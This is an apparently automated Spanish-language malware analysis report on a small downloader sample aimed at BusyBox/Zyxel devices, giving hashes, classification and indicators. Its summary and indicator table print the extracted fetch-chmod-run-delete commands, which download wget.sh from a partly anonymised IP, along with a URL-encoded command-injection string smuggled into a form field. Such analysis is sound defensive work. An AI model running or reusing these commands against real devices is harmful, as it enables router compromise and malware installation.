# 🧬 Payload Analysis

`eb0ce5cbfbdb197d000b7fb0eeebd0737f68c6a5fdef8481934f52e7346c69e4`

## 📌 Resumen

Texto ASCII de 347 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `busybox wget hxxp://91.92.40.XXX/wget.sh -O .s`
2. `curl -o .s hxxp://91.92.40.XXX/wget.sh`
3. `chmod 777 .s`
4. `sh .s rep.zyxel2`
5. `rm -f .s` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/eb0ce5cbfbdb197d000b7fb0eeebd0737f68c6a5fdef8481934f52e7346c69e4.md](../../../../../malware-like/oraculo/downloader/eb0ce5cbfbdb197d000b7fb0eeebd0737f68c6a5fdef8481934f52e7346c69e4.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:51:31.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `eb0ce5cbfbdb197d000b7fb0eeebd0737f68c6a5fdef8481934f52e7346c69e4`
- **SHA1:** `5c2bccf5bd3e85c0e58a53feaf042d3586464555`
- **MD5:** `c63c332d77d58ff38d1bc523447fc4a7`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (347), with no line terminators |
| Tamaño | 347 B |
| Entropía | 4.97 |
| Strings | 1 |

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with very long lines (347), with no line terminators; iocs=3

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh%20-O%20.s%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O%20.s%3Bcurl%20-o%20.s%20http://91.92.40.XXX/wget.sh%3Bchmod%20777%20.s%3Bsh%20.s%20rep.zyxel2%3Brm%20-f%20.s%3B%23&remoteSubmit=Save | strings |
| ip | 91.92.40.XXX | static_analysis |
| hash | eb0ce5cbfbdb197d000b7fb0eeebd0737f68c6a5fdef8481934f52e7346c69e4 | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
